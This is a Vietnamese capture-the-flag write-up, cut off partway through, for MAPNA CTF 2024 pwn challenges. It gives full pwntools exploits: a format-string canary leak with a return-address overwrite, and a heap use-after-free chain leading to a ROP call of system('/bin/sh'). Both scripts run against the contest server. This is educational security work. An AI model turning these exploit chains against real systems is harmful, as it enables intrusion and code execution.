[{"content":"","date":"21 January 2024","permalink":"/tags/2024/","section":"Tags","summary":"","title":"2024"},{"content":"","date":"21 January 2024","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"21 January 2024","permalink":"/tags/ctf/","section":"Tags","summary":"","title":"ctf"},{"content":"","date":"21 January 2024","permalink":"/tags/mapna/","section":"Tags","summary":"","title":"MAPNA"},{"content":"ninipwn # Mô tả: pwn ^ pwn ^ pwn ^ pwn ^ pwn ^ pwn\nKiểm tra sơ bộ # Đề cung cấp 2 file binary ninipwn và Dockerfile nhưng tạm thời mình sẽ không quan tâm đến file Dockerfile này trừ khi cần sử dụng đến libc.\nSử dụng checksec lên file ninipwn cho chúng ta kết quả như sau:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Tiếp theo mình sẽ check sâu hơn vào file chương trình mà đề cho.\nPhân tích source code # Chương trình có 3 hàm quan trọng cần chú ý là main, encryption_service, encrypt và 1 hàm win chính là target mà chúng ta cần phải gọi tới.\nHàm main của chương trình như sau:\nint __fastcall main(int argc, const char **argv, const char **envp) { disable_io_buffering(argc, argv, envp); puts(\u0026#34;XOR encryption service\u0026#34;); encryption_service(); return 0; } Hàm disable_io_buffering chủ yếu để set buffer cho stdin, stdout và stderr cho việc connect trên remote nên chúng ta không cần phải quan tâm quá nhiều.\nTiếp theo là hàm encryption_service:\nunsigned __int64 encryption_service() { char buf[264]; // [rsp+0h] [rbp-110h] BYREF unsigned __int64 v2; // [rsp+108h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\u0026#34;Text length: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;text_length); getchar(); if ( (unsigned int)text_length \u0026lt; 257 ) { printf(\u0026#34;Key: \u0026#34;); read(0, key, 10uLL); printf(\u0026#34;Key selected: \u0026#34;); printf(key); putchar(0xA); printf(\u0026#34;Text: \u0026#34;); read(0, buf, text_length); encrypt((__int64)buf); printf(\u0026#34;Encrypted output: \u0026#34;); write(1, buf, text_length); } else { puts(\u0026#34;Text length must be less than 256\u0026#34;); } return v2 - __readfsqword(0x28u); } Hàm hay sẽ đọc input lần lượt 3 thứ: biến global text_length chứa độ dài cần đọc của biến buf, biến global key và biến local buf.\nChương trình sẽ kiểm tra biến text_length không được vượt quá 256 để chống stack overflow trên biến buf. Vậy nghĩa là chúng ta phải tìm cách bypass được cái check này hoặc tìm cách exploit khác.\nNgoài ra thì hàm này còn dính phải lỗi format string khi nó gọi printf thẳng lên biến key mà người dùng input. Mình đoán là sẽ phải tận dụng lỗi này để leak một giá trị nào đó vì độ dài của biến key có giới hạn nên khó có thể khai thác lỗi này để ghi đè lên đâu đó được.\nTiếp theo thì chương trình sẽ mang biến buf pass vào hàm encrypt.\n__int64 __fastcall encrypt(__int64 a1) { __int64 result; // rax int i; // [rsp+14h] [rbp-4h] for ( i = 0; ; ++i ) { result = (unsigned int)text_length; if ( i \u0026gt;= text_length ) { break; } *(_BYTE *)(i + a1) ^= key[i % 8]; } return result; } Hàm này không có gì đặc biệt ngoài việc nó mã hóa chuỗi truyền vào bằng cách mang XOR với 8 ký tự của biến key.\nTới đây thì mình chợt nhận ra một điều là trong hàm encryption_service chương trình yêu cầu nhập tối đa 10 ký tự cho biến key nhưng trong hàm encrypt lại chỉ sử dụng 8 ký tự để XOR. Nên là mình đã check xem địa chỉ của biến key này nằm như thế nào trên memory.\n.bss:0000000000004050 public key .bss:0000000000004050 ; char key[8] .bss:0000000000004050 key db 8 dup(?) ; DATA XREF: encrypt+35↑o .bss:0000000000004050 ; encryption_service+99↑o .bss:0000000000004050 ; encryption_service+C1↑o .bss:0000000000004058 public text_length .bss:0000000000004058 text_length dd ? Chúng ta có thể dễ dàng nhận thấy rằng địa chỉ của biến key nằm ở địa chỉ 0x4050 trong khi biến text_length nằm tại 0x4058. 2 biến này cách nhau chỉ 8 byte nhưng chương trình lại đọc tận 10 byte vào biến key.\nĐồng thời chương trình chỉ đọc input vô biến key sau khi đã kiểm tra giá trị của biến text_length nên chúng ta hoàn toàn có thể tận dụng lỗi này để ghi đè lên biến text_length thông qua việc đọc input vào biến key, từ đó khiến text_length mang giá trị đủ lớn để overflow thông qua biến buf nằm trên stack.\nLên kịch bản khai thác # Vì hàm main và win chỉ cách biệt nhau đúng 1 byte nên việc chương trình bật chế độ bảo vệ PIE không phải vấn đề cần lo lắng vì chúng ta chỉ cần ghi đè lên byte cuối cùng của địa chỉ trả về của hàm encryption_service mà không cần quan tâm đến các byte ngẫu nhiên sau đó.\nNgoài ra, chúng ta cũng cần phải kiểm soát được giá trị sẽ ghi đè lên biến text_length do tính chất của hàm encrypt sẽ thực hiện phép XOR lên text_length ký tự trên stack nên để tránh việc hàm encrypt thực hiện phép XOR lên các byte ngẫu nhiên của địa chỉ trả về từ đó khiến chương trình bị lỗi. Vậy nên mình sẽ chỉ set giá trị của text_length bằng đúng với độ dài của payload.\nTuy nhiên như đã thấy ở bước kiểm tra sơ bộ, chương trình có bật stack canary nên mình không thể cứ thế mà overflow đại trên stack cho đến khi gặp địa chỉ trả về được. Nên mình có thể tận dụng lỗi format string đã nói ở trên để leak được giá trị canary đang nằm trên stack ra.\nVới tất cả các mảnh ghép đã đầy đủ, điều duy nhất còn lại là viết script khai thác thôi.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;ninipwn\u0026#39;, False) io = remote(\u0026#39;3.75.185.198\u0026#39;, 7000) def encrypt(data, key): assert len(data) == len(key) return xor(data, key) io.sendlineafter(b\u0026#39;: \u0026#39;, b\u0026#39;256\u0026#39;) key = b\u0026#39;%39$lx--\u0026#39; io.sendafter(b\u0026#39;: \u0026#39;, key+b\u0026#39;\\x19\\x01\u0026#39;) # last 2 bytes need to be 0x119 (the length of our payload) so the encrypt function only encrypts our payload io.recvuntil(b\u0026#39;: \u0026#39;) canary = int(io.recvline().split(b\u0026#39;--\u0026#39;)[0], 16) payload = b\u0026#39;\\0\u0026#39;*264 + encrypt(p64(canary), key) + b\u0026#39;\\0\u0026#39;*8 + b\u0026#39;\\x16\u0026#39; # 0x16 ^ \u0026#39;%\u0026#39; = 0x33 aka 1st byte of win function io.sendafter(b\u0026#39;: \u0026#39;, payload) io.interactive() $ python3 exp.py [+] Opening connection to 3.75.185.198 on port 7000: Done [*] Switching to interactive mode Encrypted output: %39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--%39$lx--\\x00\\xe4\u0026lt;\\x9e\\x92JQM%39 $ ls flag.txt ninipwn $ cat flag.txt MAPNA{d1d-y0u-x0r-7h3-r37urn-4ddr355??-a428b23} Buggy Paint # Mô tả: I wrote a paint for myself but It seems kinda buggy\nKiểm tra sơ bộ # Đề cho chúng ta 4 file: binary chall, libc libc.so.6, loader ld-linux-x86-64.so.2 và Dockerfile. Thấy đề cho thẳng file libc như vậy nên là mình cứ dùng pwninit link nó vào file chương trình trước luôn cho chắc.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.4_amd64.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) copying ./chall to ./chall_patched running patchelf on ./chall_patched $ mv chall_patched chall Sử dụng checksec lên file chall cho chúng ta kết quả như sau:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b\u0026#39;.\u0026#39; Cũng không khác gì bài trước. Giờ vô kiểm tra chương trình nào.\nPhân tích source code # File chương trình đã bị strip để bỏ đi tên các symbol nên khi ném vào trong các decompiler thì nó sẽ chỉ hiện tên các hàm là 1 mớ gì đó rất khó nhớ nên mình đã ngồi đổi lại tên 1 số hàm dựa trên công dụng và luồng thực thi để tiện quan sát, theo dõi và phân tích hơn.\nĐầu tiên là hàm main:\n__int64 __fastcall main(__int64 a1, char **a2, char **a3) { int v4; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); disable_io_buffering(a1, a2, a3); puts(\u0026#34;Welcome to BuggyPaint!\u0026#34;); while ( 1 ) { print_grid(); menu(); v4 = 0xFFFFFFFF; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v4); getchar(); switch ( v4 ) { case 1: create_box(); break; case 2: delete_box(); break; case 3: select_box(); break; case 4: edit_selected_box(); break; case 5: show_selected_box(); break; default: puts(\u0026#34;Invalid option\u0026#34;); return 0LL; } } } Hàm print_grid nhìn vô thì thấy 1 mớ hổ lốn nhưng thật ra những gì nó làm chỉ là in ra màn hình khối hộp to tượng trưng cho 1 vùng trống nào đấy giống như bản đồ với format màu các kiểu thôi nên không cần bận tâm tới. Kiểu như thế này nè:\nWelcome to BuggyPaint! ================================== | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | ================================== Hàm menu thì in ra cho chúng ta các option như sau:\nint menu() { puts(\u0026#34;1. create box\u0026#34;); puts(\u0026#34;2. delete box\u0026#34;); puts(\u0026#34;3. select box\u0026#34;); puts(\u0026#34;4. edit selected box\u0026#34;); puts(\u0026#34;5. show selected box\u0026#34;); return printf(\u0026#34;\u0026gt; \u0026#34;); } Các hàm tương ứng với mỗi lựa chọn trong menu như sau:\nunsigned __int64 create_box() { const char *v0; // rax int v2; // [rsp+Ch] [rbp-34h] BYREF unsigned __int64 v3; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-28h] BYREF unsigned __int64 v5; // [rsp+20h] [rbp-20h] BYREF unsigned __int64 v6; // [rsp+28h] [rbp-18h] BYREF void *v7; // [rsp+30h] [rbp-10h] unsigned __int64 v8; // [rsp+38h] [rbp-8h] v8 = __readfsqword(0x28u); printf(\u0026#34;x: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v3); printf(\u0026#34;y: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v4); printf(\u0026#34;width: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v5); printf(\u0026#34;height: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v6); printf(\u0026#34;color(1=red, 2=green): \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v2); getchar(); if ( v3 \u0026lt;= 31 \u0026amp;\u0026amp; v4 \u0026lt;= 31 \u0026amp;\u0026amp; v5 \u0026lt;= 32 \u0026amp;\u0026amp; v6 \u0026lt;= 32 \u0026amp;\u0026amp; v3 + v5 \u0026lt;= 32 \u0026amp;\u0026amp; v4 + v5 \u0026lt;= 32 ) { if ( v2 \u0026gt; 0 \u0026amp;\u0026amp; v2 \u0026lt;= 2 ) { if ( qword_4060[0x20 * v3 + v4] ) { puts(\u0026#34;The selected cell is full\u0026#34;); } else { v7 = malloc(48uLL); *(_QWORD *)v7 = v3; *((_QWORD *)v7 + 1) = v4; *((_QWORD *)v7 + 3) = v5; *((_QWORD *)v7 + 4) = v6; if ( v2 == 1 ) { v0 = \u0026#34;\\x1B[31m\u0026#34;; } else { v0 = \u0026#34;\\x1B[32m\u0026#34;; } *((_QWORD *)v7 + 2) = v0; *((_QWORD *)v7 + 5) = malloc(v5 * v6); memset(*((void **)v7 + 5), 0, v6 * v5); printf(\u0026#34;content: \u0026#34;); read(0, *((void **)v7 + 5), v6 * v5); qword_4060[0x20 * v3 + v4] = v7; } } else { puts(\u0026#34;Wrong color\u0026#34;); } } else { puts(\u0026#34;Bad dimensions\u0026#34;); } return v8 - __readfsqword(0x28u); } unsigned __int64 delete_box() { unsigned __int64 v1; // [rsp+8h] [rbp-18h] BYREF unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\u0026#34;x: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v1); printf(\u0026#34;y: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v2); if ( v1 \u0026lt;= 0x1F \u0026amp;\u0026amp; v2 \u0026lt;= 0x1F ) { if ( qword_4060[0x20 * v1 + v2] ) { free(*(void **)(qword_4060[0x20 * v1 + v2] + 0x28LL)); free((void *)qword_4060[0x20 * v1 + v2]); qword_4060[0x20 * v1 + v2] = 0LL; } else { puts(\u0026#34;Empty cell\u0026#34;); } } else { puts(\u0026#34;Bad coordinates\u0026#34;); } return v3 - __readfsqword(0x28u); } unsigned __int64 select_box() { unsigned __int64 v1; // [rsp+8h] [rbp-18h] BYREF unsigned __int64 v2; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\u0026#34;x: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v1); printf(\u0026#34;y: \u0026#34;); __isoc99_scanf(\u0026#34;%lu\u0026#34;, \u0026amp;v2); if ( v1 \u0026lt;= 0x1F \u0026amp;\u0026amp; v2 \u0026lt;= 0x1F ) { if ( qword_4060[0x20 * v1 + v2] ) { qword_6060 = qword_4060[0x20 * v1 + v2]; } else { puts(\u0026#34;Empty cell\u0026#34;); } } else { puts(\u0026#34;Bad coordinates\u0026#34;); } return v3 - __readfsqword(0x28u); } ssize_t edit_selected_box() { printf(\u0026#34;New content: \u0026#34;); return read(0, *(void **)(qword_6060 + 0x28), *(_QWORD *)(qword_6060 + 0x20) * *(_QWORD *)(qword_6060 + 0x18)); } unsigned __int64 show_selected_box() { unsigned __int64 result; // rax unsigned __int64 i; // [rsp+8h] [rbp-18h] size_t n; // [rsp+10h] [rbp-10h] unsigned __int64 v3; // [rsp+18h] [rbp-8h] puts(\u0026#34;Box content:\u0026#34;); n = *(_QWORD *)(qword_6060 + 0x18); v3 = *(_QWORD *)(qword_6060 + 0x20); for ( i = 0LL; ; ++i ) { result = i; if ( i \u0026gt;= v3 ) { break; } write(1, (const void *)(*(_QWORD *)(qword_6060 + 0x28) + n * i), n); putchar(0xA); } return result; } Nhìn qua thì cực kỳ rối mắt luôn đúng không? Nhưng mà mình sẽ tóm tắt lại ở đây cho dễ hiểu.\nĐầu tiên thì bên trong chương trình sẽ khởi tạo 1 mảng 32x32 tạm gọi là map[32][32] (hàm print_grid khi này chính là dùng để in cái mảng này ra nè) và define 1 struct tạm gọi là Box như sau:\nstruct Box { int64_t x; int64_t y; char* color; int64_t width; int64_t height; char* content; }; Trong đó:\nx và y: tọa độ của Box trên mảng color: chứa địa chỉ của chuỗi format màu (đỏ hoặc xanh) trong chương trình width và height: chiều dài và rộng của Box content: chứa địa chỉ của chuỗi nội dung mà người dùng nhập vào cho Box (độ lớn = diện tích Box = width x height) Cơ bản là người dùng sẽ được tạo các Box ở những vị trí cụ thể trên mảng 32x32 và gán nội dung vào bên trong những Box này. Các hàm cụ thể có công dụng như sau:\nHàm create_box:\nYêu cầu nhập vào các thông tin (x, y, width, height, color) của Box muốn tạo Check xem tọa độ đã có Box hay chưa Malloc chunk có size bằng size của struct Box là 48 byte (gọi là chunk struct) Malloc chunk có size bằng diện tích Box (gọi là chunk content) và set vô biến content trong Box Yêu cầu nhập vào content cho Box Set địa chỉ chunk struct lên mảng tại map[x][y] Hàm delete_box:\nYêu cầu nhập vào tọa độ Box cần xóa Check xem tọa độ đã có Box để xóa hay không Free chunk content của Box Free chunk struct của Box Set mảng map[x][y] = 0 Hàm select_box:\nYêu cầu nhập vào tọa độ Box cần xóa Check xem tọa độ có Box hay không Lưu địa chỉ của Box tại map[x][y] vào một biến global qword_6060 (từ giờ sẽ gọi là chosen_box) Hàm edit_selected_box:\nĐọc vào chunk content của chosen_box với số lượng ký tự bằng với diện tích Box Hàm show_selected_box:\nIn ra màn hình nội dung trong content của chosen_box Luồng thực thi chủ yếu của chương trình sẽ dựa vào lựa chọn của người dùng. Nhìn qua thì có vẻ đây là 1 challenge heap cơ bản.\nTuy nhiên thì chương trình sau khi free chunk struct thì sẽ set lại map[x][y] = 0 nhưng nhờ vào biến chosen_box nên chúng ta vẫn có thể sử dụng lại và leak chunk đã được free bằng cách set Box cần leak vào chosen_box trước sau đó free Box này và dùng đến các hàm edit_selected_box và show_selected_box.\nLên kịch bản khai thác # Từ khúc này trở xuống khuyến khích các bạn có sẵn nền tảng cơ bản về heap, malloc và tcache\u0026hellip; trước thì sẽ dễ hiểu hơn. Mình sẽ trình bày cách giải theo hướng từ dưới lên nhé.\nVì chương trình sử dụng libc bản về sau nên việc khai thác __free_hook không còn khả thi nữa nên target của chúng ta sẽ là leak địa chỉ stack thông qua symbol __environ trong libc sau đó tạo 1 rop chain trên stack để gọi system.\nMà để có được địa chỉ libc thì mình cần phải leak nó thông qua GOT hoặc vùng nhớ chứa stdin, stdout, stderr trong chương trình. Mà chương trình thì có bật chế độ bảo vệ PIE.\nMình sẽ leak địa chỉ chương trình thông qua vùng nhớ heap. Còn nhớ ban nãy trong struct Box có chứa một biến color chính là địa chỉ chuỗi format màu đỏ hoặc xanh nằm trong chương trình không? Mình sẽ có thể phải bằng cách nào đó leak được địa chỉ này ra.\nVà để leak được địa chỉ này thì đương nhiên không thể thiếu 1 thứ cực kỳ quan trọng chính là địa chỉ heap. Mà để leak được địa chỉ heap thì chúng ta có thể khai thác lỗi UAF (Use After Free) với biến chosen_box như đã nói ở trên để lấy được địa chỉ heap base chính nằm trong chunk đầu tiên sau khi được free.\nĐể hình dung cách hoạt động thì hãy nhìn vào luồng thực thi sau:\nĐầu tiên thì mình sẽ malloc 1 chunk 0 với content size \u0026gt;= 8 (để leak được 8 byte địa chỉ):\nchunk 0: struct chunk 0 -\u0026gt; content chunk 0 chosen_box: tcache Mũi tên (-\u0026gt;) biểu thị con trỏ mà biến content trong struct Box đang trỏ đến. Sau đó mình set chosen_box là chunk 0 này:\nchunk 0: struct chunk 0 -\u0026gt; content chunk 0 chosen_box: struct chunk 0 -\u0026gt; content chunk 0 tcache Tiến hành free chunk 0:\nchunk 0: chosen_box: struct chunk 0 (đã free) -\u0026gt; content chunk 0 (đã free) tcache \u0026lt;- content chunk 0 (đã free) \u0026lt;- struct chunk 0 (đã free) Lúc này thì content chunk 0 đang được tcache dùng chứa địa chỉ heap (heap base \u0026raquo; 12). Chúng ta chỉ cần gọi hàm show_selected_box là đã có thể leak được địa chỉ heap ra ngoài.\nVà khi đã có địa chỉ heap rồi thì chúng ta có thể malloc và free làm sao để khiến cho content chunk của Box này chính là struct chunk của Box khác từ đó thay đổi được địa chỉ content trong struct trỏ đến 1 struct chunk khác để leak địa chỉ chương trình. Tương tự từ địa chỉ chương trình -\u0026gt; địa chỉ libc -\u0026gt; địa chỉ stack.\nĐể hiểu rõ hơn cách hoạt động của cách khai thác này thì chúng ta cũng nhìn qua luồng thực thi sau, giả sử rằng đã biết được địa chỉ heap:\nĐầu tiên thì mình sẽ malloc 2 chunk 0 và 1 với content size khác 48 (là size của struct chunk):\nchunk 0: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) chunk 1: struct chunk 1 (48 byte) -\u0026gt; content chunk 1 (n byte) chosen_box: tcache Sau đó mình set chosen_box là chunk 0:\nchunk 0: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) chunk 1: struct chunk 1 (48 byte) -\u0026gt; content chunk 1 (n byte) chosen_box: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) tcache Tiến hành free chunk 0 trước sau đó free chunk 1:\nchunk 0: chunk 1: chosen_box: struct chunk 0 (48 byte) -\u0026gt; content chunk 0 (n byte) tcache \u0026lt;- content chunk 0 (n byte, đã free) \u0026lt;- struct chunk 0 (48 byte, đã free) \u0026lt;- content chunk 1 (n byte, đã free) \u0026lt;- struct chunk 1 (48 byte, đã free) Sau đó chúng ta sẽ malloc 1 chunk 2 có content size là 48 byte (= size struct chunk). Và vì content size = struct size nên chúng ta cũng sẽ khởi tạo trước nội dung của content này theo struct Box như sau:\nstruct Box { int64_t x = 0; // tọa độ bất kỳ int64_t y = 0; // tọa độ bất kỳ char* color = heap base; // địa chỉ bất kỳ int64_t width = 8; // để leak 8 byte địa chỉ int64_t height = 1; // chỉ cần leak 1 địa chỉ char* content = leak_address; // địa chỉ cần leak trên heap chứa địa chỉ chuỗi format màu }; Mình sẽ gọi chuỗi 48 byte này là fake_data. Như vậy thì lúc này trên heap của chúng ta sẽ như sau:\nchunk 0: chunk 1: chunk 2: struct chunk 1 (48 byte) -\u0026gt; struct chunk 0 (48 byte, đang chứa fake_data biểu thị đúng như một struct chunk) chosen_box: struct chunk 0 (48 byte, đang chứa fake_data biểu thị đúng như một struct chunk) -\u0026gt; địa chỉ cần leak tcache \u0026lt;- content chunk 0 (n byte, đã free) \u0026lt;- content chunk 1 (n byte, đã free) Do tính chất của việc giải phóng và cấp phát bộ nhớ heap trên libc mà struct chunk của 2 chunk 0 và 1 đã được tận dụng lại và cấp cho chunk 2.\nDo chúng ta đã truyền fake_data vào content chunk của chunk 2 (aka struct chunk của chunk 0) mà giờ chỉ cần gọi hàm show_selected_box là có thể leak được 8 byte giá trị tại địa chỉ mong muốn.\nTừ đó chúng ta cứ thế mà free chunk 2 sau đó lại malloc 1 chunk mới với fake_data chứa địa chỉ cần leak tiếp theo. Cứ thực hiện leak theo quy trình địa chỉ heap -\u0026gt; địa chỉ chương trình -\u0026gt; địa chỉ libc -\u0026gt; địa chỉ stack.\nVà sau khi đã có được địa chỉ stack thì thay vì dùng nó để leak tiếp thì mình sẽ dùng tới hàm edit_selected_box để tạo rop chain trên stack thôi. Tới đây thì mọi mảnh ghép đã vào đúng ví trí rồi.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;chall\u0026#39;, False) libc = ELF(\u0026#39;libc.so.6\u0026#39;, False) rop = ROP(libc) # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;3.75.185.198\u0026#39;, 2000) def create_box(x, y, w, h, color, data): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;x: \u0026#39;, str(x).encode()) io.sendlineafter(b\u0026#39;y: \u0026#39;, str(y).encode()) io.sendlineafter(b\u0026#39;width: \u0026#39;, str(w).encode()) io.sendlineafter(b\u0026#39;height: \u0026#39;, str(h).encode()) io.sendlineafter(b\u0026#39;): \u0026#39;, str(color).encode()) io.sendafter(b\u0026#39;content: \u0026#39;, data) def delete_box(x, y): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;x: \u0026#39;, str(x).encode()) io.sendlineafter(b\u0026#39;y: \u0026#39;, str(y).encode()) def select_box(x, y): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;x: \u0026#39;, str(x).encode()) io.sendlineafter(b\u0026#39;y: \u0026#39;, str(y).encode()) def edit_box(data): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;4\u0026#39;) io.sendafter(b\u0026#39;content: \u0026#39;, data) def show_box(): io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;5\u0026#39;) io.recvuntil(b\u0026#39;content:\\n\u0026#39;) # initialize create_box(0, 0, 8, 2, 1, b\u0026#39;chunk 0\u0026#39;) create_box(1, 1, 8, 2, 1, b\u0026#39;chunk 1\u0026#39;) # leak heap base select_box(0, 0) delete_box(0, 0) show_box() heap_base = u64(io.recvline(keepends=False)) \u0026lt;\u0026lt; 12 log.info(f\u0026#39;heap base: {hex(heap_base)}\u0026#39;) # leak elf base delete_box(1, 1) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(1) + p64(heap_base + 0x310) create_box(0, 0, 8, 6, 1, fake_data) show_box() exe.address = u64(io.recvline(keepends=False)) - 0x207d log.info(f\u0026#39;exe base: {hex(exe.address)}\u0026#39;) # leak libc base delete_box(0, 0) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(1) + p64(exe.got[\u0026#39;puts\u0026#39;]) create_box(0, 0, 8, 6, 1, fake_data) show_box() libc.address = u64(io.recvline(keepends=False)) - libc.sym[\u0026#39;puts\u0026#39;] log.info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) # leak stack through eviron delete_box(0, 0) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(1) + p64(libc.sym[\u0026#39;__environ\u0026#39;]) create_box(0, 0, 8, 6, 1, fake_data) show_box() stack = u64(io.recvline(keepends=False)) - 288 log.info(f\u0026#39;stack pointer at ret main: {hex(stack)}\u0026#39;) # ROP pop_rdi = libc.address + rop.find_gadget([\u0026#39;pop rdi\u0026#39;, \u0026#39;ret\u0026#39;])[0] delete_box(0, 0) fake_data = p64(0) + p64(0) + p64(heap_base) + p64(8) + p64(4) + p64(stack) create_box(0, 0, 8, 6, 1, fake_data) payload = p64(pop_rdi) + p64(next(libc.search(b\u0026#39;/bin/sh\\0\u0026#39;))) + p64(pop_rdi+1) + p64(libc.sym[\u0026#39;system\u0026#39;]) edit_box(payload) io.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;, b\u0026#39;0\u0026#39;) io.interactive() $ python3 exp.py [*] Loaded 219 cached gadgets for \u0026#39;libc.so.6\u0026#39; [+] Opening connection to 3.75.185.198 on port 2000: Done [*] heap base: 0x55b1b7529000 [*] exe base: 0x55b1b5f65000 [*] libc base: 0x7f15bfb78000 [*] stack pointer at ret main: 0x7fff0224ce58 [*] Switching to interactive mode Invalid option $ ls chall flag.txt ld-linux-x86-64.so.2 libc.so.6 $ cat flag.txt MAPNA{1-c4n7-b3l13v3-7h47-4-bu6-c4n-l34d-70-7h15-f23f344b} Protector # Mô tả: my flag is protected! what are you gonna do\nKiểm tra sơ bộ # Đề cho chúng ta 3 file: binary chall, Dockerfile và 1 file generate_directory_tree.py. Vì bài trước đã có đụng đến libc rồi nên khá sure là bài này khả năng cao cũng sẽ cần nên mình dựng lại 1 cái container như trong Dockerfile để lấy 2 file libc và loader ra sau đó link chúng lại với file chương trình.\n$ pwninit bin: ./chall libc: ./libc.so.6 ld: ./ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.35-0ubuntu3.6_amd64.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) copying ./chall to ./chall_patched running patchelf on ./chall_patched writing solve.py stub $ mv chall_patched chall Sử dụng checksec lên file chall cho chúng ta kết quả như sau:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fd000) RUNPATH: b\u0026#39;.\u0026#39; Chương trình lần này vừa không bật PIE và canary cũng đồng thời cho chúng ta ghi đè lên GOT (Partial RELRO). Nhưng vì bài này ra sau và số solve còn thấp hơn Buggy Paint nên mình đoán là bài này cũng chẳng phải dạng vừa.\nTiếp theo thì mình sẽ kiểm tra file python generate_directory_tree.py.\nimport os import random import string flag = \u0026#34;MAPNA{placeholder_for_flag}\u0026#34; MIN_NAME_LENGTH = 8 MAX_NAME_LENGTH = 16 FILES_COUNT = 0x100 def get_random_name(): n = random.randint(MIN_NAME_LENGTH, MAX_NAME_LENGTH) return \u0026#34;\u0026#34;.join(random.choice(string.ascii_letters + string.digits) for i in range(n)) def generate_files(): files = [get_random_name() for i in range(FILES_COUNT)] real_flag_file = random.choice(files) for filepath in files: if filepath == real_flag_file: continue with open(filepath, \u0026#34;w\u0026#34;) as f: pass with open(real_flag_file, \u0026#34;w\u0026#34;) as f: f.write(flag) def main(): os.mkdir(\u0026#34;maze\u0026#34;) os.chdir(\u0026#34;maze\u0026#34;) generate_files() if __name__ == \u0026#34;__main__\u0026#34;: main() TLDR: khi chạy file này thì nó sẽ tạo một thư mục tên maze sau đó thì tạo 1 mớ file với tên ngẫu nhiên và đặt flag vào 1 trong số đó.\nTới đây là thấy khoai rồi vì mấy bài thường mà để flag không ở trong file tên flag hay flag.txt hay dính tới seccomp với getdents lắm.\nTới đây thì mình cũng quyết định kiểm tra luôn Dockerfile để xem toàn bộ chương trình sẽ được deploy lên remote như thế nào.\nFROM ubuntu@sha256:e6173d4dc55e76b87c4af8db8821b1feae4146dd47341e4d431118c7dd060a74 RUN apt-get -y update RUN apt-get -y upgrade RUN apt-get -y install socat python3 RUN useradd -m pwn WORKDIR /home/pwn COPY ./chall . COPY generate_directory_tree.py . RUN python3 generate_directory_tree.py RUN chown -R root:root /home/pwn RUN chmod -R 555 /home/pwn CMD [\u0026#34;socat\u0026#34;, \u0026#34;TCP-LISTEN:5000,reuseaddr,fork\u0026#34;, \u0026#34;EXEC:\u0026#39;timeout 60 su pwn -c ./chall\u0026#39;\u0026#34;] Vậy là khi deploy thì file generate_directory_tree.py sẽ được chạy trước để giấu flag đi sau đó file chương trình mới chạy.\nKiểm tra sơ nhiêu đây chắc là đủ rồi. Giờ thì check xem chương trình nó làm gì cái nào.\nPhân tích source code # Hàm main của chương trình được decompile ra như sau:\nint __fastcall main(int argc, const char **argv, const char **envp) { char buf[32]; // [rsp+0h] [rbp-20h] BYREF disable_io_buffering(argc, argv, envp); 